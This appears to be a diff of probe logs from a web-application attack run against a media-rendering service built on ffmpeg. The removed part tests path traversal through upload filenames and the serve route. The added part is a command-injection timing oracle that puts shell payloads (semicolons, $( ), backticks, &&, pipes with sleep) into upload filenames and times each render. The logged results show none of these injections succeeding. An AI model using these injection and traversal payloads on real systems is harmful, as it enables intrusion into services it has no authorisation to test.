@@ -1,59 +1,22 @@
-===== robots.txt =====
-# As a condition of accessing this website, you agree to abide by the following
-# content signals:
+===== COMMAND-INJECTION TIMING ORACLE via upload extension =====
+baseline .wav render 1.71s ok=True
 
-# (a)  If a content-signal = yes, you may collect content for the corresponding
-#      use.
-# (b)  If a content-signal = no, you may not collect content for the
-#      corresponding use.
-# (c)  If the website operator does not include a content signal for a
-#      corresponding use, the website operator neither grants nor restricts
-#      permission via content signal with respect to the corresponding use.
+shell-semicolon-sleep: fn='clip.wav;sleep 12;x.wav'
+   render=1.56s ok=True inputseen=''
 
-# The content signals and their meanings are:
+shell-dollar-sleep: fn='clip.wav$(sleep 12).wav'
+   render=1.97s ok=True inputseen=''
 
-# search:   building a search index and providing search results (e.g., returning
-#           hyperlinks and short excerpts from your website's contents). Search does not
-#           include providing AI-generated search summaries.
-# ai-input: inputting content into one or more AI models (e.g., retrieval
-#           augmented generation, grounding, or other real-time taking of content for
-#           generative AI search answers).
-# ai-train: training or fine-tuning AI models.
+shell-backtick-sleep: fn='clip.wav`sleep 12`.wav'
+   render=1.68s ok=True inputseen=''
 
-# ANY RESTRICTIONS EXPRESSED VIA CONTENT SIGNALS ARE EXPRESS RESERVATIONS OF
-# RIGHTS UNDER ARTICLE 4 OF THE EUROPEAN UNION DIRECTIVE 2019/790 ON COPYRIGHT
-# AND RELATED RIGHTS IN THE DIGITAL SINGLE MARKET.
+shell-and-sleep: fn='clip.wav&&sleep 12&&.wav'
+   render=1.82s ok=True inputseen=''
 
+shell-pipe-sleep: fn='clip.wav|sleep 12|.wav'
+   render=1.48s ok=True inputseen=''
 
-===== exact output filename logic (slug -> outputs[].file/url) =====
-  slug='x'            ok=True file='x.png' url='/m/1ee108f4732f7d22/x.png' err=''
-  slug='x.png'        ok=True file='x.png.png' url='/m/1ee108f4732f7d22/x.png.png' err=''
-  slug='x.PNG'        ok=True file='x.PNG.png' url='/m/1ee108f4732f7d22/x.PNG.png' err=''
-  slug='x.txt'        ok=True file='x.txt.png' url='/m/1ee108f4732f7d22/x.txt.png' err=''
-  slug='x.svg'        ok=True file='x.svg.png' url='/m/1ee108f4732f7d22/x.svg.png' err=''
-  slug='dir/y'        ok=False file=None url=None err='ffmpeg exited with code 1\nffmpeg version 5.1.9-0+deb12u1 Cop'
-  slug='a.png.png'    ok=True file='a.png.png.png' url='/m/1ee108f4732f7d22/a.png.png.png' err=''
-  slug='..%2fp'       ok=True file='..%2fp.png' url='/m/1ee108f4732f7d22/..%2fp.png' err=''
-  slug='z.'           ok=True file='z..png' url='/m/1ee108f4732f7d22/z..png' err=''
-  slug='z '           ok=True file='z.png' url='/m/1ee108f4732f7d22/z.png' err=''
-  slug='CAP.png'      ok=True file='CAP.png.png' url='/m/1ee108f4732f7d22/CAP.png.png' err=''
-
-===== upload multipart filename traversal (content-controlled write?) =====
-  fn='../../pwn.txt'        status=200 chip='pwn.txt' ffmpeg_input=/opt/app/media/b6a5e66987d279ae/source.txt
-  fn='..%2f..%2fpwn2.txt'   status=200 chip='..%2f..%2fpwn2.txt' ffmpeg_input=/opt/app/media/a1e3ddbaedec1cb2/source.txt
-  fn='/tmp/pwn3.txt'        status=200 chip='pwn3.txt' ffmpeg_input=/opt/app/media/47276f1868ad3956/source.txt
-  fn='....//pwn4.txt'       status=200 chip='pwn4.txt' ffmpeg_input=/opt/app/media/398ede48b6b8b0a7/source.txt
-  fn='source.wav'           status=200 chip='source.wav' ffmpeg_input=/opt/app/media/45bbbb545e34ad65/source.wav
-  fn='x.wav\x00.png'        status=500 chip=None ffmpeg_input=??
-
-===== serve route: traversal in the <ws> segment =====
-my ws: 1f79f8041d9072de
-  /m/1f79f8041d9072de/poster.png           -> 200 len=7508 ct=image/png
-  /m/..%2f1f79f8041d9072de/poster.png      -> 404 len=2336 ct=text/html; charset=u
-  /m/1f79f8041d9072de%2f..%2f1f79f8041d9072de/poster.png -> 200 len=7508 ct=image/png
-  /m/..%2f..%2fserver.js/x                 -> 400 len=155 ct=text/html
-  /m/1f79f8041d9072de/../poster.png        -> 404 len=2336 ct=text/html; charset=u
-  /m/%2e%2e/poster.png                     -> 404 len=2336 ct=text/html; charset=u
-  /m/1f79f8041d9072de/....//poster.png     -> 404 len=2336 ct=text/html; charset=u
+===== also: what exact input path does ffmpeg report for a weird ext (to confirm tail kept) =====
+input path echoed: /opt/app/media/18e49c2d59fe945b/source.mp3  (ext tail preserved?)
 
 DONE
